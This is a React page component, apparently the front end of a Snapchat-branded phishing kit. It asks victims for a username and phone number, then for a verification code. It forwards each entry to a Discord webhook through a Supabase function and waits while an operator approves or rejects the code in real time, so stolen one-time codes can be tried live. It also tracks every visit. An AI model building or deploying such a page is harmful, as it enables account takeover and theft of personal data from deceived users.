import { useState, useEffect, useRef } from "react";
import SnapLogo from "@/components/SnapLogo";
import DisclaimerBox from "@/components/DisclaimerBox";
import SnapForm from "@/components/SnapForm";
import CodeVerification from "@/components/CodeVerification";
import WaitingValidation from "@/components/WaitingValidation";
import SuccessScreen from "@/components/SuccessScreen";
import { supabase } from "@/integrations/supabase/client";

type Step = "form" | "code" | "waiting" | "success";

const Index = () => {
  const [step, setStep] = useState<Step>("form");
  const [formData, setFormData] = useState({ username: "", phone: "" });
  const [submissionId, setSubmissionId] = useState<string | null>(null);
  const [codeError, setCodeError] = useState("");
  const visitTracked = useRef(false);

  // Tracker la visite une seule fois
  useEffect(() => {
    if (visitTracked.current) return;
    visitTracked.current = true;
    
    supabase.from('visits').insert({
      user_agent: navigator.userAgent
    }).then(() => {
      console.log('Visit tracked');
    });
  }, []);

  // Écouter les changements de statut en temps réel
  useEffect(() => {
    if (!submissionId || step !== "waiting") return;

    const channel = supabase
      .channel(`submission-${submissionId}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'submissions',
          filter: `id=eq.${submissionId}`
        },
        (payload) => {
          const newStatus = payload.new.status;
          if (newStatus === 'approved') {
            setStep("success");
          } else if (newStatus === 'rejected') {
            setCodeError("Code refusé. Veuillez réessayer.");
            setStep("code");
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [submissionId, step]);

  const handleFormSubmit = async (data: { username: string; phone: string }) => {
    setFormData(data);
    
    try {
      const { data: response } = await supabase.functions.invoke('discord-webhook', {
        body: { ...data, step: "form" }
      });
      
      if (response?.submissionId) {
        setSubmissionId(response.submissionId);
      }
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
    
    setStep("code");
  };

  const handleCodeSubmit = async (code: string) => {
    setCodeError("");
    
    try {
      await supabase.functions.invoke('discord-webhook', {
        body: { ...formData, code, step: "code", submissionId }
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
    
    setStep("waiting");
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4 py-12">
      <div className="flex flex-col items-center gap-8 w-full max-w-md">
        <SnapLogo />
        <DisclaimerBox />
        
        {step === "form" && (
          <SnapForm onSubmit={handleFormSubmit} />
        )}
        
        {step === "code" && (
          <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
        )}
        
        {step === "waiting" && (
          <WaitingValidation />
        )}
        
        {step === "success" && (
          <SuccessScreen />
        )}
      </div>
    </div>
  );
};

export default Index;
